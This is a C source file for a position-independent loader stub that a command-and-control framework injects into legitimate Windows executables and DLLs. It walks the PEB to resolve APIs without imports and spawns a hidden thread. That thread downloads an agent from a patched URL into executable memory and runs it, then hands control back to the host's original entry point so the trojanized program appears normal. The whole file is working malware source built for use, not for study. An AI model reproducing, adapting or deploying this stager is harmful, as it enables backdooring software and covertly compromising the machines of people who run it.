/*
 * Position-independent Windows loader stub (compiled to flat shellcode).
 *
 * Injected by the C2 "Native Binder" into a host PE: a new .c2 section is added
 * and the entry point is repointed here. At runtime this stub:
 *   1. Resolves kernel32 + APIs via a PEB/Ldr walk (no imports, no CRT).
 *   2. Spawns a background thread that downloads the Position-Independent-Agent
 *      (PIA) .bin from the patched URL over WinINet and runs it in-memory.
 *   3. Resumes the host's original entry point so the legit binary runs normally.
 *
 * One source builds both x64 and x86 (offsets selected by __x86_64__).
 *
 * Two fields are patched by the binder at bind time (both ASCII-findable so the
 * shared LoaderUrlPatcher works):
 *   - SHELLCODE_URL_PLACEHOLDER : 256-byte slot holding the agent URL.
 *   - C2OEPRAV + 4 bytes        : the host's original entry-point RVA (uint32 LE),
 *                                 written over the sentinel's last 4 bytes.
 *
 * Build (CI): mingw gcc -ffreestanding ... then objcopy -O binary →
 * stub-x64-exe.bin / stub-x64-dll.bin. See stub.ld + release.yml.
 */

#include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */

/* Entry-point mode: exactly one of BUILD_FOR_DLL / BUILD_FOR_EXE must be defined
 * on the compile line (see README). The binder picks the variant matching the
 * host it injects into. */
#if defined(BUILD_FOR_DLL) && defined(BUILD_FOR_EXE)
#error "Define only one of BUILD_FOR_DLL or BUILD_FOR_EXE, not both."
#endif
#if !defined(BUILD_FOR_DLL) && !defined(BUILD_FOR_EXE)
#error "Define exactly one of BUILD_FOR_DLL or BUILD_FOR_EXE."
#endif

/* ── Arch-specific PEB/Ldr + PE-layout offsets ─────────────────────────────── */
#ifdef __x86_64__
typedef unsigned long long uptr;
#define PEB() ((uptr)__readgsqword(0x60))
#define LDR_OFF 0x18        /* PEB->Ldr                                              */
#define INMEM_OFF 0x20      /* &Ldr.InMemoryOrderModuleList sentinel                 */
#define INLOAD_OFF 0x10     /* &Ldr.InLoadOrderModuleList sentinel                   */
#define DBASE_INMEM 0x20    /* DllBase, from an InMemoryOrderLinks node              */
#define BASENAME_INMEM 0x48 /* BaseDllName (UNICODE_STRING), from an InMemoryOrderLinks node */
#define BUFPTR_OFF 0x08     /* Buffer field within a UNICODE_STRING (ptr-aligned)     */
#define DBASE_INLOAD 0x30   /* DllBase, from an InLoadOrderLinks node                */
#define EXPDIR_OFF 0x88     /* export-directory RVA slot (DataDirectory[0]) at base+e_lfanew */
#else
typedef unsigned long uptr; /* 4-byte pointer width on x86 (deferred target)         */
#define PEB() ((uptr)__readfsdword(0x30))
#define LDR_OFF 0x0C
#define INMEM_OFF 0x14
#define INLOAD_OFF 0x0C
#define DBASE_INMEM 0x10
#define BASENAME_INMEM 0x24 /* BaseDllName (UNICODE_STRING) offset from an InMemoryOrderLinks node */
#define BUFPTR_OFF 0x04     /* Buffer field offset within a UNICODE_STRING */
#define DBASE_INLOAD 0x18
#define EXPDIR_OFF 0x78
#endif

/* ── Generic Win32 / PE numeric constants ──────────────────────────────────── */
typedef unsigned int u32;
typedef unsigned short u16;

#define E_LFANEW_OFF 0x3c  /* PE-signature offset field, from image base   */
#define EXP_NUMNAMES 0x18  /* NumberOfNames field in the export directory  */
#define EXP_ADDRFUNCS 0x1c /* AddressOfFunctions RVA field                 */
#define EXP_ADDRNAMES 0x20 /* AddressOfNames RVA field                     */
#define EXP_ADDRORDS 0x24  /* AddressOfNameOrdinals RVA field              */

#define DLL_PROCESS_ATTACH 1

#define MEM_COMMIT_RESERVE 0x3000     /* MEM_COMMIT | MEM_RESERVE                     */
#define PAGE_RWX 0x40                 /* PAGE_EXECUTE_READWRITE                       */
#define AGENT_BUF_SIZE 0x400000       /* 4 MiB max downloaded agent                   */
#define AGENT_READ_CHUNK 0x100000     /* 1 MiB per InternetReadFile call              */
#define INET_OPENURL_FLAGS 0x84000000 /* INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE */

/* ── API function-pointer types ───────────────────────────────────────────── */
typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);

typedef void *(WINAPI *VirtualAlloc_t)(
    void *addr,
    uptr size,
    u32 allocType,
    u32 protect);

typedef void *(WINAPI *CreateThread_t)(
    void *sa,
    uptr stack,
    u32(WINAPI *start)(void *),
    void *param,
    u32 flags,
    u32 *tid);

typedef void *(WINAPI *InternetOpenA_t)(
    const char *agent,
    u32 access,
    const char *proxy,
    const char *bypass,
    u32 flags);

typedef void *(WINAPI *InternetOpenUrlA_t)(
    void *hInternet,
    const char *url,
    const char *headers,
    u32 hlen,
    u32 flags,
    uptr ctx);

typedef int(WINAPI *InternetReadFile_t)(
    void *hFile,
    void *buf,
    u32 toRead,
    u32 *bytesRead);

struct API
{
    LoadLibraryA_t pLoadLibraryA;
    VirtualAlloc_t pVirtualAlloc;
    CreateThread_t pCreateThread;
    InternetOpenA_t pInternetOpenA;
    InternetOpenUrlA_t pInternetOpenUrlA;
    InternetReadFile_t pInternetReadFile;
};

/* ── String helpers ────────────────────────────────────────────────────────── */

static int streq(const char *a, const char *b)
{
    while (*a && *b)
    {
        if (*a != *b)
            return 0;
        a++;
        b++;
    }
    return *a == *b;
}

/* Normalize one UTF-16 code unit into a lowercase ASCII byte ('A'–'Z' → 'a'–'z';
 * every other code unit narrows to char unchanged). This is the single place
 * that knows how to make a wide char comparable to an ASCII literal. */
static char to_lower_ascii(u16 c)
{
    if (c >= 'A' && c <= 'Z')
        return (char)(c + 'a' - 'A');
    return (char)c;
}

/* Compare a UTF-16LE module basename against an ASCII literal for equality,
 * delegating all normalization to to_lower_ascii. The literal may be passed
 * with or without the file extension: "kernel32" matches L"kernel32.dll" but
 * not L"kernelbase.dll". Returns 1 on match. */
static int name_ieq(const u16 *wide, u32 wchars, const char *ascii)
{
    u32 i;
    for (i = 0; i < wchars; i++)
    {
        char a = to_lower_ascii(wide[i]);
        char b = ascii[i];

        if (b == 0)
            /* literal ended: basename must end here or at its extension dot */
            return a == '.' || a == 0;
        if (a != to_lower_ascii((u16)(unsigned char)b))
            return 0;
    }
    /* basename ended: a match only if the literal ended too (full match) */
    return ascii[i] == 0;
}

/* ── Module + export resolution (PEB/Ldr walk, no imports) ─────────────────── */

/* GetModuleHandle-style lookup: walk PEB.Ldr.InMemoryOrderModuleList and return
 * the base of the loaded module whose basename matches `name` (case-insensitive,
 * extension optional). Returns 0 if not found. Matching by name (not fixed list
 * position) survives module load-order differences across Windows builds. */
static uptr get_module_base(const char *name)
{
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr head = ldr + INMEM_OFF; /* &InMemoryOrderModuleList (list sentinel) */
    uptr cur = *(uptr *)head;    /* first entry's InMemoryOrderLinks */

    while (cur != head)
    {
        u32 wbytes = *(u16 *)(cur + BASENAME_INMEM);
        u16 *wname = (u16 *)*(uptr *)(cur + BASENAME_INMEM + BUFPTR_OFF);
        uptr base = *(uptr *)(cur + DBASE_INMEM);

        if (base && wname && name_ieq(wname, wbytes / 2, name))
            return base;

        cur = *(uptr *)cur; /* advance via Flink */
    }
    return 0;
}

/* kernel32.dll — the bootstrap module the stub resolves its first exports from. */
static uptr kernel32_base(void)
{
    return get_module_base("kernel32");
}

/* Walk a module's PE export table and return the address of the named export,
 * or 0 if not found. */
static void *resolve_export(uptr base, const char *name)
{
    u32 e_lfanew = *(u32 *)(base + E_LFANEW_OFF);
    uptr expDir = base + *(u32 *)(base + e_lfanew + EXPDIR_OFF);
    u32 numNames = *(u32 *)(expDir + EXP_NUMNAMES);
    uptr names = base + *(u32 *)(expDir + EXP_ADDRNAMES);
    uptr funcs = base + *(u32 *)(expDir + EXP_ADDRFUNCS);
    uptr ords = base + *(u32 *)(expDir + EXP_ADDRORDS);

    for (u32 i = 0; i < numNames; i++)
    {
        const char *expName = (const char *)(base + *(u32 *)(names + i * 4));
        if (streq(expName, name))
        {
            u16 ord = *(u16 *)(ords + i * 2);
            return (void *)(base + *(u32 *)(funcs + ord * 4));
        }
    }
    return 0;
}

/* ── API resolution ────────────────────────────────────────────────────────── */

/* Resolve the kernel32-sourced slots of `api` (LoadLibraryA, VirtualAlloc).
 * Returns 0 if kernel32 or either export is unavailable. */
static int resolve_kernel32_apis(struct API *api)
{
    uptr k32 = kernel32_base();
    if (!k32)
        return 0;

    api->pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
    api->pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
    return api->pLoadLibraryA != 0 && api->pVirtualAlloc != 0;
}

/* Load wininet.dll and resolve its three slots in `api`. Leaves the slots zero
 * and returns 0 if wininet (or any export) is unavailable. */
static int resolve_wininet_apis(struct API *api)
{
    uptr wininet = (uptr)api->pLoadLibraryA("wininet.dll");
    if (!wininet)
        return 0;

    api->pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
    api->pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
    api->pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
    return api->pInternetOpenA != 0 && api->pInternetOpenUrlA != 0 && api->pInternetReadFile != 0;
}

/* ── Background download + execute ────────────────────────────────────────── */
char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";

/* Allocate the RWX landing buffer for the agent. Returns 0 on failure. */
static void *alloc_agent_buffer(struct API *api)
{
    return api->pVirtualAlloc(0, AGENT_BUF_SIZE, MEM_COMMIT_RESERVE, PAGE_RWX);
}

/* Download the agent from `url` into `buf` (capped at AGENT_BUF_SIZE); returns
 * the number of bytes written (0 if nothing was fetched or a handle was denied). */
static uptr fetch_agent(struct API *api, const char *url, void *buf)
{
    void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
    if (!hInternet)
        return 0;

    void *hUrl = api->pInternetOpenUrlA(hInternet, url, 0, 0, INET_OPENURL_FLAGS, 0);
    if (!hUrl)
        return 0;

    uptr off = 0;
    u32 got = 0;
    do
    {
        api->pInternetReadFile(hUrl, (char *)buf + off, AGENT_READ_CHUNK, &got);
        off += got;
    } while (got && off < AGENT_BUF_SIZE);

    return off;
}

/* Hand control to the downloaded position-independent agent at `buf`. Its return
 * value becomes the stager thread's exit code. */
static u32 run_agent(void *buf)
{
    return ((u32 (*)(void))buf)();
}

/* Stager thread body: resolve APIs, fetch the agent, run it. */
static u32 download_thread(void *param)
{
    (void)param;
    struct API api = {0};

    if (!resolve_kernel32_apis(&api))
        return 0;
    if (!resolve_wininet_apis(&api))
        return 0;

    void *buf = alloc_agent_buffer(&api);
    if (!buf)
        return 0;

    if (!fetch_agent(&api, g_url, buf))
        return 0;
    return run_agent(buf);
}

/* ── Entry helpers ─────────────────────────────────────────────────────────── */

/* Spawn the stager thread (resolves CreateThread from kernel32). No-op if
 * kernel32 or CreateThread can't be resolved. */
static void spawn_download_thread(void)
{
    uptr k32 = kernel32_base();
    if (!k32)
        return;

    CreateThread_t pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
    if (pCreateThread)
        pCreateThread(0, 0, (u32 (*)(void *))download_thread, 0, 0, 0);
}

/* Read the host's original entry-point RVA. The binder patches this 4-byte LE
 * value into the slot at marker+4 (overwriting the sentinel's last 4 bytes) at
 * bind time. `volatile` defeats the -O2 constant-fold that would otherwise erase
 * the sentinel, keeping it inline and ASCII-discoverable in the flat binary. */
static u32 read_oep_rva(void)
{
    volatile char marker[12] = "C2OEPRAV";
    return *(volatile u32 *)(marker + 4);
}

#if defined(BUILD_FOR_EXE)
/* Image base of the host EXE = first node of PEB.Ldr.InLoadOrderModuleList.
 * (DLL builds receive the base as the hinstDLL argument, so this is EXE-only.) */
static uptr exe_image_base(void)
{
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr first = *(uptr *)(ldr + INLOAD_OFF);
    return *(uptr *)(first + DBASE_INLOAD);
}
#endif

/* ── Entry (placed first in .text via section attr) ───────────────────────── */

/* Single shared entry point. The binder repoints the host's entry here for
 * either image kind. The signature matches the DLL/DllMain contract (hinstDLL is
 * the image base, fdwReason the reason code, lpReserved reserved); an EXE entry
 * is called with no meaningful arguments, so the EXE path ignores all three and
 * derives its base from the PEB instead. (On x64 WINAPI == the default ABI, and
 * an unused parameter costs no code, so one signature serves both.) */
__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
                                                                int fdwReason,
                                                                void *lpReserved)
{
#if defined(BUILD_FOR_DLL)
    /* DllMain: fire the stager once on attach, then resume the original below. */
    if (fdwReason == DLL_PROCESS_ATTACH)
        spawn_download_thread();
#else /* BUILD_FOR_EXE */
    /* EXE entry: no usable arguments — mark them unused and spawn unconditionally. */
    (void)hinstDLL;
    (void)fdwReason;
    (void)lpReserved;
    spawn_download_thread();
#endif

    u32 oep = read_oep_rva();

#if defined(BUILD_FOR_DLL)
    /* Tail-call the original DllMain at base + OEP RVA. */
    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
#else
    /* Jump to the original EXE entry; control never returns here. */
    ((void (*)(void))(exe_image_base() + oep))();
    for (;;)
    {
    }
#endif
}
